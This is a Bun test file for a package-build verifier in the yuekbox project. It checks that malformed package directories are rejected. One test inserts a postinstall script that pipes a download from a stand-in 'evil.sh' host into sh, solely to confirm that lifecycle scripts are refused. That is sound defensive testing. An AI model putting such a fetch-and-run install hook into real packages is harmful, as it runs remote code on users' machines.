// Contract tests for the npm package build (#99).
//
// The seam is `verifyPackageDir`: everything that must be true of the built
// package directory before `npm pack` is allowed to ship it. The script's
// build step is exercised separately by the integration test at the bottom.

import { describe, test, expect, afterAll } from "bun:test"
import { chmod, cp, mkdir, mkdtemp, rm, stat, writeFile } from "node:fs/promises"
import path from "node:path"
import os from "node:os"
import { verifyPackageDir } from "./build-package.ts"

const tmpRoot = await mkdtemp(path.join(os.tmpdir(), "yuekbox-pkg-test."))
const dirsToClean: string[] = []

afterAll(async () => {
  await rm(tmpRoot, { recursive: true, force: true })
  await Promise.all(dirsToClean.map((dir) => rm(dir, { recursive: true, force: true })))
})

const scratch = async (): Promise<string> => {
  const dir = await mkdtemp(path.join(tmpRoot, "pkg."))
  dirsToClean.push(dir)
  return dir
}

const writeExecutable = async (dir: string, name: string, body: string): Promise<void> => {
  const file = path.join(dir, name)
  await writeFile(file, body)
  await chmod(file, 0o755)
}

// A minimal layout that satisfies every rule in the contract. Tests corrupt
// one thing at a time to pin each rule.
const goodLayout = async (): Promise<string> => {
  const dir = await scratch()
  await mkdir(path.join(dir, "migrations"), { recursive: true })
  await mkdir(path.join(dir, "tools", "yue2"), { recursive: true })
  await mkdir(path.join(dir, "tools", "sheetsage2"), { recursive: true })
  await mkdir(path.join(dir, "tools", "lyric-align"), { recursive: true })
  await writeExecutable(dir, "server.js", "#!/usr/bin/env bun\nconsole.log(1)\n")
  await writeFile(path.join(dir, "migrations", "0000_init.sql"), "create table songs(id);\n")
  await writeFile(path.join(dir, "tools", "yue2", "generate.py"), "print('hi')\n")
  await writeFile(path.join(dir, "tools", "sheetsage2", "transcribe.py"), "print('hi')\n")
  await writeFile(path.join(dir, "tools", "lyric-align", "align.py"), "print('hi')\n")
  await writeFile(
    path.join(dir, "server.html"),
    '<!doctype html><html><head><link href="./chunk-abc.css" /><script src="./chunk-abc.js"></script></head><body><div id="root"></div></body></html>',
  )
  await writeFile(
    path.join(dir, "package.json"),
    JSON.stringify({
      name: "yuekbox",
      version: "0.5.0",
      type: "module",
      license: "MIT",
      engines: { bun: ">=1.4.2" },
      repository: { type: "git", url: "git+https://github.com/codenamegary/yuekbox.git" },
      os: ["linux", "darwin"],
      bin: { yuekbox: "server.js" },
    }),
  )
  return dir
}

describe("verifyPackageDir", () => {
  test("accepts a correct package dir", async () => {
    const dir = await goodLayout()
    await expect(verifyPackageDir(dir, { version: "0.5.0" })).resolves.toBeUndefined()
  })

  test("rejects a package.json that is not yuekbox at the expected version", async () => {
    const dir = await goodLayout()
    const pkg = JSON.parse(await Bun.file(path.join(dir, "package.json")).text())
    pkg.name = "not-yuekbox"
    await Bun.write(path.join(dir, "package.json"), JSON.stringify(pkg))
    await expect(verifyPackageDir(dir, { version: "0.5.0" })).rejects.toThrow(/name/)
  })

  test("rejects a version that does not match the release tag", async () => {
    const dir = await goodLayout()
    await expect(verifyPackageDir(dir, { version: "0.6.0" })).rejects.toThrow(/version/)
  })

  test("rejects lifecycle scripts", async () => {
    const dir = await goodLayout()
    const pkg = JSON.parse(await Bun.file(path.join(dir, "package.json")).text())
    pkg.scripts = { postinstall: "curl evil.sh | sh" }
    await Bun.write(path.join(dir, "package.json"), JSON.stringify(pkg))
    await expect(verifyPackageDir(dir, { version: "0.5.0" })).rejects.toThrow(/scripts/)
  })

  test("rejects runtime dependencies, bundled packages carry none", async () => {
    const dir = await goodLayout()
    const pkg = JSON.parse(await Bun.file(path.join(dir, "package.json")).text())
    pkg.dependencies = { "left-pad": "^1.0.0" }
    await Bun.write(path.join(dir, "package.json"), JSON.stringify(pkg))
    await expect(verifyPackageDir(dir, { version: "0.5.0" })).rejects.toThrow(/dependencies/)
  })

  test("rejects a bin entry whose file lacks the bun shebang", async () => {
    const dir = await goodLayout()
    await Bun.write(path.join(dir, "server.js"), "console.log(1)\n")
    await expect(verifyPackageDir(dir, { version: "0.5.0" })).rejects.toThrow(/shebang/)
  })

  test("rejects a bin entry whose file is not executable", async () => {
    const dir = await goodLayout()
    await chmod(path.join(dir, "server.js"), 0o644)
    await expect(verifyPackageDir(dir, { version: "0.5.0" })).rejects.toThrow(/executable/)
  })

  test("rejects a missing migrations tree", async () => {
    const dir = await goodLayout()
    await rm(path.join(dir, "migrations"), { recursive: true })
    await expect(verifyPackageDir(dir, { version: "0.5.0" })).rejects.toThrow(/migrations/)
  })

  test("rejects a tools tree without the yue2 helper", async () => {
    const dir = await goodLayout()
    await rm(path.join(dir, "tools", "yue2", "generate.py"))
    await expect(verifyPackageDir(dir, { version: "0.5.0" })).rejects.toThrow(/generate\.py/)
  })

  test("rejects a build without the SPA html shell", async () => {
    const dir = await goodLayout()
    await rm(path.join(dir, "server.html"))
    await expect(verifyPackageDir(dir, { version: "0.5.0" })).rejects.toThrow(/html/)
  })

  test("rejects an html shell that does not reference the hashed chunks", async () => {
    const dir = await goodLayout()
    await Bun.write(path.join(dir, "server.html"), "<!doctype html><html><body>empty</body></html>")
    await expect(verifyPackageDir(dir, { version: "0.5.0" })).rejects.toThrow(/chunk/)
  })

  test("rejects a package installable on unsupported operating systems", async () => {
    const dir = await goodLayout()
    const pkg = JSON.parse(await Bun.file(path.join(dir, "package.json")).text())
    delete pkg.os
    await Bun.write(path.join(dir, "package.json"), JSON.stringify(pkg))
    await expect(verifyPackageDir(dir, { version: "0.5.0" })).rejects.toThrow(/os/)
  })
})

// The real build must produce a directory that passes the contract. Slow
// (full tailwind bundle) but it is the behavior that matters: what the script
// writes is what npm ships.
describe("build-package", () => {
  test(
    "bun scripts/build-package.ts produces a publishable package dir",
    async () => {
      const out = await scratch()
      const proc = Bun.spawnSync(["bun", "scripts/build-package.ts", out], {
        cwd: path.resolve(import.meta.dir, ".."),
        stdout: "pipe",
        stderr: "pipe",
      })
      const log = `${proc.stdout.toString()}${proc.stderr.toString()}`
      expect(proc.exitCode).toBe(0)

      const rootVersion = JSON.parse(
        await Bun.file(path.resolve(import.meta.dir, "..", "package.json")).text(),
      ).version as string
      await expect(verifyPackageDir(out, { version: rootVersion })).resolves.toBeUndefined()

      // The SPA must actually be there, not just an empty shell.
      const htmlBody = await Bun.file(path.join(out, "server.html")).text()
      expect(htmlBody).toContain("<!doctype html>")
      expect(htmlBody).toContain("chunk-")

      // The bundle is real application code, not a stub.
      const serverStat = await stat(path.join(out, "server.js"))
      expect(serverStat.size).toBeGreaterThan(100_000)
    },
    { timeout: 300_000 },
  )
})
